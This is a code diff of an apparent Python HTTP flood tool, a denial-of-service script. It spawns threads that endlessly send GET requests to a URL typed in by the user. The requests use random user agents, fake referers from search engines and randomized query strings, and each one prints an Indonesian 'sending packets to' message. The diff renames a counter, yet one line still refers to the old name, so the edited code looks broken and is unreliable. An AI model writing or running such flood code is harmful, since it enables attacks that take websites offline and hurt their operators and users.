@@ -43,7 +43,7 @@ print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵�
 print("\033[32m-------------------------------->>>\033[0m")
 url = input("URL:  ").strip()
 
-count = 0
+u = int(0)
 headers = []
 referer = [
     "https://google.it/",
@@ -79,13 +79,13 @@ def genstr(size):
 
 class httpth1(threading.Thread):
     def run(self):
-        global count
+        global u
         while True:
             try:
                 headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
-                count += 1
+                u += 1
                 print("[+]\033[92mNOZZ: \033[97mMENGIRIM-PAKET ke \033[1m" +url+ "\033[0m" .format(count))
        
             except requests.exceptions.ConnectionError:
